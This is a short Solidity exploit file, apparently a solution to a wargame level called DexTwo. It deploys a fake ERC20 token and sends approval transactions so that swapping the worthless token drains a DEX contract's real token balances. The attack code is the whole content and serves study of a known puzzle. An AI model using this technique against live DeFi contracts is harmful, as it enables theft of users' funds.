// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.7.0/contracts/token/ERC20/ERC20.sol";

/**
    @title Hack DexTwo
    @notice By using an external token, the swap amount can be manipulated to drain the contract from their token balance. 
            1 MTK is minted for the DexTwo contract, we swap 1 MTK to TKN1/TK2. The DexTwo contract transfers 100 TKN1/TKN2.
*/

contract Token1 is ERC20 {
    address DexTwo = 0x888d8E28d45a1b032d3599fCe47ce11130Cc0424;

    constructor() ERC20("MyToken", "MTK") {
        _mint(DexTwo, 1);
        _mint(msg.sender, 100);
    }
}

// Approve contract to spend our token balance
// sendTransaction({from:player, to:await contract.token1(), data:"0x095ea7b30000000000000000000000006666300839bD5aE87E09122D6715071AcE9112B80000000000000000000000000000000000000000000010000000000000000000"})
// sendTransaction({from:player, to:await contract.token2(), data:"0x095ea7b30000000000000000000000006666300839bD5aE87E09122D6715071AcE9112B80000000000000000000000000000000000000000000010000000000000000000"})
// sendTransaction({from:player, to:MTK, data:"0x095ea7b30000000000000000000000006666300839bD5aE87E09122D6715071AcE9112B80000000000000000000000000000000000000000000010000000000000000000"})
